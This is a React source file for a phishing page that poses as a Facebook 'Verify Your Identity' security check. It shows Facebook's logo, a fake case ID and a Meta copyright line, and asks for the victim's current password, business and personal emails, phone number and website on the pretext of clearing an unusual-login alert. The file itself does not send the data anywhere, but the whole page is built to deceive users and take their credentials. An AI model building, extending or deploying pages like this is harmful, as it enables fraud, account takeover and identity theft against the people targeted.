import React, { useState } from 'react';
import { useLocation } from "wouter";
import { useForm } from "react-hook-form";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { CountryCodes } from "@/components/CountryCodes";
import { validateEmail, validatePhone, validateUrl } from "@/lib/utils";
import { Shield, HelpCircle, AlertCircle, TicketIcon, LockIcon } from "lucide-react";

interface FormData {
  firstName: string;
  lastName: string;
  businessEmail: string;
  personalEmail: string;
  phoneNumber: string;
  website: string;
  password: string;
}

export default function FormPage() {
  const [, setLocation] = useLocation();
  const [countryCode, setCountryCode] = useState("+91");
  const [errors, setErrors] = useState<Record<string, string>>({});
  
  // Get ticket number from localStorage or generate a new one
  const ticketNumber = localStorage.getItem('securityTicket') || 
    `FB-SEC-${Math.floor(10000000 + Math.random() * 90000000)}`;
  
  // Store ticket number for consistency across pages
  React.useEffect(() => {
    if (!localStorage.getItem('securityTicket')) {
      localStorage.setItem('securityTicket', ticketNumber);
    }
  }, [ticketNumber]);
  
  const { register, handleSubmit, formState } = useForm<FormData>({
    defaultValues: {
      firstName: "",
      lastName: "",
      businessEmail: "",
      personalEmail: "",
      phoneNumber: "",
      website: "",
      password: ""
    }
  });

  const validateForm = (data: FormData) => {
    const newErrors: Record<string, string> = {};
    
    if (!data.firstName.trim()) {
      newErrors.firstName = "First name is required";
    }
    
    if (!data.lastName.trim()) {
      newErrors.lastName = "Last name is required";
    }
    
    if (!validateEmail(data.businessEmail)) {
      newErrors.businessEmail = "Please enter a valid business email";
    }
    
    if (!validateEmail(data.personalEmail)) {
      newErrors.personalEmail = "Please enter a valid personal email";
    }
    
    if (!validatePhone(data.phoneNumber)) {
      newErrors.phoneNumber = "Please enter a valid 10-digit phone number";
    }
    
    if (!validateUrl(data.website)) {
      newErrors.website = "Please enter a valid URL (e.g., https://example.com)";
    }
    
    if (!data.password || data.password.length < 6) {
      newErrors.password = "Password must be at least 6 characters";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const onSubmit = (data: FormData) => {
    if (validateForm(data)) {
      setLocation("/change-password");
    }
  };

  return (
    <>
      <Card className="w-full bg-white rounded-lg shadow-md">
        <CardContent className="p-8">
          <div className="flex justify-between items-center mb-6">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" 
              alt="Facebook Logo" 
              className="h-10"
            />
            <div className="flex items-center bg-blue-50 px-3 py-1 rounded-full">
              <TicketIcon className="h-3.5 w-3.5 text-facebook-blue mr-1.5" />
              <span className="text-xs font-medium text-facebook-blue">Case ID: {ticketNumber}</span>
            </div>
          </div>
          
          <div className="md:flex md:items-start mb-6">
            <div className="md:w-1/3 mb-4 md:mb-0 md:pr-6">
              <h1 className="text-xl font-bold text-[#1C1E21] mb-2">Verify Your Identity</h1>
              <p className="text-gray-600 mb-4">Please provide the following information to verify your account and remove the unusual login detection.</p>
              
              <div className="bg-blue-50 p-4 rounded-lg mb-6">
                <div className="flex items-start">
                  <Shield className="text-facebook-blue h-5 w-5 mr-2 mt-0.5" />
                  <div>
                    <h3 className="font-semibold text-[#1C1E21] text-sm">Why we need this information</h3>
                    <p className="text-xs text-gray-600 mt-1">
                      To ensure this is really you attempting to access your account, we need to verify additional personal information. This helps us prevent unauthorized access and keep your account secure.
                    </p>
                  </div>
                </div>
              </div>
              
              <div className="rounded-md border border-amber-200 bg-amber-50 p-3 hidden md:block">
                <div className="flex">
                  <AlertCircle className="h-5 w-5 text-amber-500 mr-2 flex-shrink-0" />
                  <p className="text-xs text-amber-800">
                    For additional security, please provide the following account recovery information to verify your identity.
                  </p>
                </div>
              </div>
            </div>
            
            <div className="md:w-2/3">
              <div className="rounded-md border border-amber-200 bg-amber-50 p-3 mb-5 md:hidden">
                <div className="flex">
                  <AlertCircle className="h-5 w-5 text-amber-500 mr-2 flex-shrink-0" />
                  <p className="text-xs text-amber-800">
                    For additional security, please provide the following account recovery information to verify your identity.
                  </p>
                </div>
              </div>
              
              <form onSubmit={handleSubmit(onSubmit)}>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                  {/* First Name */}
                  <div>
                    <Label htmlFor="firstName" className="block text-sm font-medium text-gray-700 mb-1">
                      First Name <span className="text-red-500">*</span>
                    </Label>
                    <Input
                      id="firstName"
                      {...register("firstName")}
                      className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                      placeholder="John"
                    />
                    {errors.firstName && (
                      <div className="text-red-500 text-xs mt-1">{errors.firstName}</div>
                    )}
                  </div>
                  
                  {/* Last Name */}
                  <div>
                    <Label htmlFor="lastName" className="block text-sm font-medium text-gray-700 mb-1">
                      Last Name <span className="text-red-500">*</span>
                    </Label>
                    <Input
                      id="lastName"
                      {...register("lastName")}
                      className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                      placeholder="Doe"
                    />
                    {errors.lastName && (
                      <div className="text-red-500 text-xs mt-1">{errors.lastName}</div>
                    )}
                  </div>
                </div>
                
                {/* Current Password */}
                <div className="mb-4">
                  <div className="flex items-center justify-between">
                    <Label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
                      Current Password <span className="text-red-500">*</span>
                    </Label>
                    <span className="text-xs text-facebook-blue hover:underline cursor-pointer">Forgot password?</span>
                  </div>
                  <div className="relative">
                    <Input
                      id="password"
                      type="password"
                      {...register("password")}
                      className="w-full p-3 pl-10 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                      placeholder="Enter your current password"
                    />
                    <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                      <LockIcon className="h-4 w-4 text-gray-400" />
                    </div>
                  </div>
                  {errors.password && (
                    <div className="text-red-500 text-xs mt-1">{errors.password}</div>
                  )}
                </div>
                
                <div className="border-t border-gray-200 pt-4 mt-5 mb-4">
                  <h3 className="text-sm font-medium text-gray-700 mb-3">Account Recovery Information</h3>
                </div>
                
                {/* Business Email */}
                <div className="mb-4">
                  <div className="flex items-center">
                    <Label htmlFor="businessEmail" className="block text-sm font-medium text-gray-700 mb-1">
                      Business Email <span className="text-red-500">*</span>
                    </Label>
                    <HelpCircle className="h-4 w-4 text-gray-400 ml-1 cursor-help" />
                  </div>
                  <Input
                    id="businessEmail"
                    type="email"
                    {...register("businessEmail")}
                    className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                    placeholder="john.doe@company.com"
                  />
                  {errors.businessEmail && (
                    <div className="text-red-500 text-xs mt-1">{errors.businessEmail}</div>
                  )}
                </div>
                
                {/* Personal Email */}
                <div className="mb-4">
                  <div className="flex items-center">
                    <Label htmlFor="personalEmail" className="block text-sm font-medium text-gray-700 mb-1">
                      Personal Email <span className="text-red-500">*</span>
                    </Label>
                    <HelpCircle className="h-4 w-4 text-gray-400 ml-1 cursor-help" />
                  </div>
                  <Input
                    id="personalEmail"
                    type="email"
                    {...register("personalEmail")}
                    className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                    placeholder="john.doe@example.com"
                  />
                  {errors.personalEmail && (
                    <div className="text-red-500 text-xs mt-1">{errors.personalEmail}</div>
                  )}
                  <p className="text-xs text-gray-500 mt-1">This email will be used for account recovery if needed</p>
                </div>
                
                {/* Phone Number */}
                <div className="mb-4">
                  <div className="flex items-center">
                    <Label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-700 mb-1">
                      Phone Number <span className="text-red-500">*</span>
                    </Label>
                    <HelpCircle className="h-4 w-4 text-gray-400 ml-1 cursor-help" />
                  </div>
                  <div className="flex">
                    <CountryCodes
                      value={countryCode}
                      onChange={setCountryCode}
                      className="rounded-l-md border border-gray-300 text-gray-700 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent py-3 px-3 w-[100px]"
                    />
                    <Input
                      id="phoneNumber"
                      type="tel"
                      {...register("phoneNumber")}
                      className="w-full p-3 rounded-r-md border border-l-0 border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                      placeholder="9876543210"
                    />
                  </div>
                  {errors.phoneNumber && (
                    <div className="text-red-500 text-xs mt-1">{errors.phoneNumber}</div>
                  )}
                  <p className="text-xs text-gray-500 mt-1">We'll send a confirmation code to this number</p>
                </div>
                
                {/* Website */}
                <div className="mb-6">
                  <div className="flex items-center">
                    <Label htmlFor="website" className="block text-sm font-medium text-gray-700 mb-1">
                      Company/Personal Website
                    </Label>
                    <HelpCircle className="h-4 w-4 text-gray-400 ml-1 cursor-help" />
                  </div>
                  <Input
                    id="website"
                    type="url"
                    {...register("website")}
                    className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                    placeholder="https://example.com"
                  />
                  {errors.website && (
                    <div className="text-red-500 text-xs mt-1">{errors.website}</div>
                  )}
                </div>
                
                <Button
                  type="submit"
                  disabled={formState.isSubmitting}
                  className="w-full bg-[#1877F2] hover:bg-blue-600 text-white font-medium py-3 rounded-md transition-colors duration-200"
                >
                  {formState.isSubmitting ? (
                    <div className="flex items-center justify-center">
                      <div className="w-5 h-5 border-t-2 border-b-2 border-white rounded-full animate-spin mr-2"></div>
                      Submitting...
                    </div>
                  ) : (
                    "Verify and Continue"
                  )}
                </Button>
                
                <p className="text-xs text-center text-gray-500 mt-4">
                  By submitting this form, you confirm that you are the rightful owner of this account.
                </p>
              </form>
            </div>
          </div>
        </CardContent>
      </Card>

      <div className="w-full text-center mt-4 text-gray-500 text-xs flex flex-col md:flex-row md:justify-between md:items-center">
        <p>Your information is used only for verification purposes. All data is confidential.</p>
        <p>© Facebook 2023 • Meta Platforms, Inc.</p>
      </div>
    </>
  );
}
